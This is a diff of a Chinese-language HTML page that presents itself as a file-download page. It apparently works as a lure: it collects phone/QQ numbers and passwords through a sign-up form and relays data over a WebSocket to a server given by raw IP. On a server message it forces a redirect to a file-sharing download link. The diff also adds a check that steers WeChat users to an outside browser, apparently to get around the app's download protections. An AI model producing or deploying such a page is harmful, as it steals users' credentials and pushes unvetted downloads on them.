@@ -1,39 +1,58 @@
 <!DOCTYPE html>
 <html>
-<head lang="en">
-    <meta http-equiv=Content-Type content="text/html;charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="format-detection" content="telephone=no">
-    <title>登录</title>
-    <style>body{font-size:14px}h1,h2,h3,h4,h5{font-weight:400;font-style:normal}h1,.h1{font-size:20px}h2,.h2{font-size:18px}.desc{color:#b2b2b2}.warn{color:#b71414}body{background-color:#fff}.msg{padding:75px 15px 0;text-align:center}.icon_area{margin-bottom:19px}.text_area{margin-bottom:25px}.text_area .title{margin-bottom:12px}.icon_msg{width:100px;height:100px;vertical-align:middle;display:inline-block;border-radius:50%;-moz-border-radius:50%;-webkit-border-radius:50%}.icon_msg.warn{background-color:#0088ff;color:#fff;font-size:60px;font-style:normal}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{font:14px/1.5em "Helvetica Neue",Helvetica,Arial,sans-serif;background-color:#efeff4;line-height:1.6}body,h1,h2,h3,h4,h5,p,ul,ol,dl,dd,fieldset,textarea{margin:0}fieldset,legend,textarea,input,button{padding:0}button,input,select,textarea{font-family:inherit;font-size:100%;margin:0;*font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}ul,ol{padding-left:0;list-style-type:none}a img,fieldset{border:0}a{text-decoration:none}
-	input{outline-color:invert;outline-style:none;outline-width:0px;border:none;border-style:none;text-shadow:none;-webkit-user-select:text;outline-color:transparent;box-shadow:none}.reg{margin:10px auto;width:220px}.reg div{text-align:center;line-height:20px;font-size:18px;margin:15px 0}.reg .itxt{font-size:18px;width:193px;height:50px;border:1px solid#bbb;line-height:48px;padding-left:25px;color:#666;margin-bottom:10px}.reg .itxt:hover{border:1px solid#888}.reg .itxt:focus{border:1px solid#0088ff}.reg .regbtn{width:220px;height:50px;font-size:18px;text-align:center;line-height:48px;color:#fff;background-color:#0088ff;cursor:pointer}.reg .username{background:url(./user.jpg)no-repeat 5px center}.reg .password{background:url(./pass.jpg)no-repeat 5px center}
-	#pmsg{display:none}
-	#cmsg{display:none}
-	#sign{display:none}
-	</style>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+<title>获取文件</title>
 </head>
 <body>
-	<br/>
-    <div id="pmsg" class="msg"></div>
-	<div id="cmsg" style="height:18px;line-height:18px;color:red;font-size:16px;text-align:center"></div>
+<style>
+body{text-align: center;margin: 0;font-size: 16px;background-color:#efeff4;}#pmsg{margin: 0;color: #222;padding: 70px 50px 20px;text-align: center;display: none;}.topinfo{background: #08f;color: #fff;width: 80px;margin: auto;margin-bottom: 10px;height: 80px;border-radius: 50%;line-height: 80px;font-size: 50px;}.fmsg{font-size: 18px;font-weight: bold;color: #03081A;letter-spacing: 2px;}.furl{padding: 15px 0;word-break: break-all;font-size: 14px;color: #03081A;}.fbox{font-size: 16px;margin-bottom: 13px;font-weight: normal;color: #878B99;}.btn{width: 100%;margin: 13px auto 0;padding: 15px 0;font-size: 16px;text-align: center;background: #08f;color: #fff;outline: none;border: none;}#trip{background: #333;color: #fff;margin: auto;position: absolute;right: 50px;left: 50px;top: 20px;padding: 5px;display: none;}
 
-	<div id="sign" class="reg">
-		<form name="sign" action="javascript:form_submit(0);" method="post">
-			<input name="n" type="text" class="itxt username" placeholder="手机 / QQ">
-			<input name="p" type="password" class="itxt password" placeholder="密码">
-			<input name="cp" type="password" class="itxt password" placeholder="确认密码">
-			<input name="r" type="submit" class="regbtn" value="注册">
-		</form>
-	</div>
+input{outline-color:invert;outline-style:none;outline-width:0px;border:none;border-style:none;text-shadow:none;-webkit-user-select:text;outline-color:transparent;box-shadow:none}.reg{margin:10px auto;width:220px}.reg div{text-align:center;line-height:20px;font-size:18px;margin:15px 0}.reg .itxt{font-size:18px;width:193px;height:50px;border:1px solid#bbb;line-height:48px;padding-left:25px;color:#666;margin-bottom:10px}.reg .itxt:hover{border:1px solid#888}.reg .itxt:focus{border:1px solid#08f}.reg .regbtn{width:220px;height:50px;font-size:18px;text-align:center;line-height:48px;color:#fff;background-color:#08f;cursor:pointer}.reg .username{background:url(./user.jpg)no-repeat 5px center}.reg .password{background:url(./pass.jpg)no-repeat 5px center}
+#cmsg{padding:15px 5px 0;height:18px;line-height:18px;color:red;font-size:16px;text-align:center;display:none}
+#sign{display:none}
+</style>
+
+<div id="trip"></div>
+<div id="pmsg"></div>
+<div id="cmsg"></div>
+
+<div id="sign" class="reg">
+	<form name="sign" action="javascript:form_submit(0);" method="post">
+		<input name="n" type="text" class="itxt username" placeholder="手机 / QQ">
+		<input name="p" type="password" class="itxt password" placeholder="密码">
+		<input name="cp" type="password" class="itxt password" placeholder="确认密码">
+		<input name="r" type="submit" class="regbtn" value="注册">
+	</form>
+</div>
+	
+<script src="./clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn', {
+        text: function() {
+            return window.location.href;
+        }
+    });
+ 
+    clipboard.on('success', function(e) {
+        console.log(e);
+		//alert("复制成功,请打开浏览器，在地址栏粘贴访问");
+		document.getElementById('trip').innerText='复制成功，请打开浏览器，在地址栏粘贴访问';
+		document.getElementById("trip").style.display="block";
+    });
+ 
+    clipboard.on('error', function(e) {
+		document.getElementById('trip').innerText='复制失败，右上角三个点，再选择浏览器打开';
+		document.getElementById("trip").style.display="block";
+        console.log(e);
+    });
+</script>
 
 <script src="./ws.js"></script>
 <script src="./md.js"></script>
-<script src="./ua.js"></script>
 <script type="text/javascript">
 
-var msgHtml='';
 
 function qs(name) {
 	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
@@ -43,24 +62,24 @@ function qs(name) {
 	return null;
 }
 
-function show_html(id) {
+function show_html(id,html='') {
 	
 	if(id==1){//注册
 		document.getElementById('cmsg').innerText='';
 		document.getElementById('cmsg').style.display='block';
 		document.getElementById('sign').style.display='block';
 		document.getElementById('pmsg').style.display='none';
-		document.getElementById('pmsg').innerHTML='';
+		document.getElementById('pmsg').innerHTML=html;
 	}else if(id==2){//信息
 		document.getElementById('cmsg').style.display='none';
 		document.getElementById('sign').style.display='none';
-		document.getElementById('pmsg').innerHTML=msgHtml;
+		document.getElementById('pmsg').innerHTML=html;
 		document.getElementById('pmsg').style.display='block';
 	}
 }
 
 var prom = qs('p');
-//var ua = new UAParser().getResult();
+var ua = navigator.userAgent.toLowerCase();
 //var ws = new WebSocket('ws://47.97.26.16:3696');
 //ws.onopen = function(event) {}; 
 //ws.onclose = function(event) {}; 
@@ -70,10 +89,11 @@ ws.onmessage = function(event) {
 	
 	var data = JSON.parse(event.data);
 	var text = data.text.split("@");
+	//var html = '<div class="topinfo">!</div><div class="fmsg">'+text[0]+'</div><div class="furl"></div><div class="fbox">'+text[1]+'</div>';
+	//show_html(2,html);
+	document.getElementById('cmsg').innerText=text[1];
 	
-	msgHtml='<div class="icon_area"><i class="icon_msg warn">!</i></div><div class="text_area"><h2 class="title">'+text[0]+'</h2><p class="desc">'+text[1]+'</p></div><div style="margin:10px auto;width:220px;height:50px;line-height:50px;color:#fff;background-color:#0088ff;font-size:16px;text-align:center" onclick="window.location.href=\'https://uduou.lanzouw.com/b00ef1xvri\'">下载</div>';
-
-	show_html(2);
+	window.location.href='https://uduou.lanzouw.com/b00ef1xvri';
 };
 
 function form_submit(id) {
@@ -119,10 +139,17 @@ function chack_form(f){
 	}
 	return true;
 }
-show_html(1);
+
+if (ua.indexOf('micromessenger')==-1){
+    show_html(1);
+} else {
+	var html = '<div class="topinfo">!</div><div class="fmsg">访问说明</div><div class="furl"></div><div class="fbox">微信内无法下载文件，请复制链接后使用浏览器访问</div><button class="btn">点此复制链接</button>';
+	show_html(2,html);
+}
 
 
 </script>
 
+<div style="display: none;"></div>
 </body>
 </html>
